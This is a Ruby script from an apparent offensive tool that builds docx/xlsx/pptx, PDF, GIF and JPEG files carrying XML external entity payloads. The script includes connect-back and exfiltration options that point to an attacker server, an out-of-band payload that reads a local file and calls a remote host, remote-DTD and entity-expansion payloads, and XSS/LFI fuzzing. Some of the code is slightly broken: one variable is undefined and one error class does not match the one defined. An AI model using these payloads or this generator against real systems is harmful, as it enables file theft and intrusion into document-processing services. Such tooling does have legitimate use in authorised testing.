# encoding: ASCII-8BIT
require 'zipruby'
require 'highline/import'
require 'highline'
require 'fileutils'
require 'optparse'
require 'json'
require './lib/utils'

# import config @options
@options = JSON.parse(File.read('./options.json'))
@protocols = ["http","https","ftp","jar","file","netdoc","mailto","gopher"]

OptionParser.new do |opts|
	opts.banner = "Usage: oxml_xxe.rb [options]; \n\t-b or -s are required\n\n"

	opts.on("-b", "--build", "Build XE Document") do |v|
		@options["build"] = true
	end
	opts.on("-s", "--string", "String replace XE Document") do |v|
		@options["string"] = true
	end
	opts.on("-f", "--file=FILE", "docx/xlsx/pptx file to embed the string into") do |v|
		@options["file"] = v
	end
	opts.on("-z", "--fuzz=FUZZ_FILE", "A file including XSS to fuzz for, one per line") do |v|
		@options["fuzz"] = v
	end
	opts.on("-t", "--poc=POC", "Very simple XMP POC test; handles PDF, GIF, JPEG right now") do |v|
		@options["poc"] = v
	end
	opts.on("-i", "--ip=IP", "Set connect back IP") do |v|
		@options["ip"] = v
	end
	opts.on("-x", "--exfiltrate=EFILE", "The file to exfiltrate") do |v|
		@options["exfiltrate"] = v
	end
	opts.on("-r", "--rf=EXF", "The remote file to check for on attacker server") do |v|
		@options["rf"] = v
	end
	opts.on("-p", "--print-payloads", "Print the available payloads") do |v|
		@options["payload_list"] = true
	end
	opts.on('-h', '--help', 'Displays Help') do
		puts opts
		exit
	end
end.parse!

# set the protocol if the user hasn't
def set_protocol(ip)
	unless ip.include?("://")
		unless ip.include?("\\\\")
			ip = "http://"+ip
		end
	end
	return ip
end


# Keep the payloads organized
def read_payloads()
	pl = {}
	pl["entity_canary"] = ['<!DOCTYPE root [<!ENTITY canary "fza">]>', "Useful to test if entities are parsed"]
	pl["plain_entity"] = ['<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>', "A simple XML entity."]
	pl["plain_recursive"] = ['<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>', "A recursive XML entity, precursor to billion laughs attack."]
	pl["plain_parameter"] = ['<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>', "A simple parameter entity. This is useful to test if parameter entities are filtered."]
	pl["plain_parameter_recursive"] = ['<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>', "Recursive parameter entity, precusor to parameter entity billion laughs"]
	pl["parameter_connectback"] = ['<!DOCTYPE root [<!ENTITY % a SYSTEM "IP/EXF">%a;]>', "Parameter Entity Connectback, the simplest connect back test."]
	pl["oob_parameter"] = ['<!DOCTYPE root [<!ENTITY % file SYSTEM "file://FILE"><!ENTITY % a SYSTEM "IP/EXF">%a;]>',"Retrieves a file. Needs to be paired with a valid DTD containing &xxe; on the server."]
	pl["remote_DTD"] = ['<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/EXF">', "Remote DTD public check"]

	# XSS tests
	pl["CDATA_badchars"] = ['<!DOCTYPE root [<!ENTITY xxe "<![CDATA[\';!--<QQQQQ>={()}]]>">]>', "HTML "]
	pl["no_CDATA_badchars"] = ['<!DOCTYPE root [<!ENTITY xxe "\';!--<QQQQQ>={()}">]>', "U"]

	return pl
end

def read_fuzz_payloads()

	pl = {}
	pl["fuzz_CDATA (XSS Testing)"] = ['<!DOCTYPE root [<!ENTITY xxe "<![CDATA[FUZZ]]>">]>', "Takes in a file of input and inserts into CDATA"]
	pl["fuzz_no_CDATA (XSS Testing)"] = ['<!DOCTYPE root [<!ENTITY xxe "FUZZ">]>', "Takes in a file of input and inserts directly into the entity"]
	pl["fuzz_LFI"] = ['<!DOCTYPE root [<!ENTITY xxe "FUZZ">]>', "Takes in a file of input and inserts directly into the entity"]
	return pl
end


######### MAIN

# CustomError Class
class OError < RuntimeError
  attr :errorString

  def initialize(errorString)
    @errorString = errorString
  end
end


if (@options["build"]==false and @options["string"]==false and @options["payload_list"]==false and @options["fuzz"]==false)
	puts "\n Usage: oxml_xxe.rb [options]; \n\t-b or -s are required; -h for help\n\n"
	exit
end

# print the current payloads and exit
if @options["payload_list"]
	puts "PAYLOAD LIST"
	read_payloads.each do |pload|
		puts "#{pload[0]}: #{pload[1][1]} \n\t #{pload[1][0]}"
	end
	exit
end

if @options["build"]
	list_files_menu(false)
	exit
end

if @options["string"]
	list_files_menu(true)
	exit
end

if @options["poc"]
	payload = '<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "IP/EXF">'
	if payload =~ /IP/ and @options["ip"].size == 0
		@options["ip"] = ask("Payload Requires a connect back IP:")
	end

	# patch for smb, needs to be refactored throughout
	@options["ip"] = set_protocol(@options["ip"]).gsub('\\') {'\\\\'}
	payload = payload.gsub("IP",@options["ip"])


	if @options["poc"] == "pdf"
		# it's a hack, but gsubing into form pdf
		file = "./samples/form.pdf"

		puts "|+| Inserting into #{file}. Currently this only tests for PUBLIC DTD"

		len = 16724+payload.size
		nm = "./output/o_#{Time.now.to_i}.pdf"

		out = File.open(nm,"wb")
		fil = File.open(file,"rb")

		while(line = fil.gets)
			line = line.chomp
			line = line.gsub("-----",len.to_s)
			line = line.gsub("---",payload)
			out.puts(line)
		end
		puts "|+| Wrote to #{nm}"
		exit

	elsif @options["poc"] == "gif"
		file = "./samples/xmp.gif"

		puts "|+| Inserting into #{file}. Currently this only tests for PUBLIC DTD"

		nm = "./output/o_#{Time.now.to_i}.gif"

		out = File.open(nm,"wb")
		fil = File.open(file,"rb")

		while(line = fil.gets)
			line = line.gsub("-----",payload)
			out.puts(line)
		end
		puts "|+| Wrote to #{nm}"
		exit

	elsif @options["poc"] == "jpg"
		file = "./samples/tunnel-depth.jpg"

		puts "|+| Inserting into #{file}. Currently this only tests for PUBLIC DTD"

		nm = "./output/o_#{Time.now.to_i}.jpg"

		out = File.open(nm,"wb")
		fil = File.open(file,"rb")

		while(line = fil.gets)
			line = line.gsub("-----",payload.gsub('\\') {'\\\\'})
			out.puts(line)
		end
		puts "|+| Wrote to #{nm}"
		exit
	end

end


if @options["fuzz"]
	fuzzies = []

	# read in the user file
	begin
		file = File.new(@options["fuzz"],"rb")
		while (line = file.gets)
			fuzzies.push(line.chomp)
		end
	rescue
		raise ReportingError.new("Fuzz file #{@options['fuzz']} does not exist.}")
		exit
	end

	payload1 = ""
	choose do |menu|
		menu.prompt = "Choose XXE payload:"
		i = 0
		read_fuzz_payloads.each do |pload|
			menu.choice pload[0] do payload1 = pload[1][0] end
		end
	end

	@options["file"] = "./samples/lfi_test.docx" if payload == '<!DOCTYPE root [<!ENTITY xxe "FUZZ">]>'

	i = 0
	fuzzies.each do |fu|
		i = i + 1
		payloadx = payload1.gsub("FUZZ",fu)
		find_string(payloadx,i)
	end
end

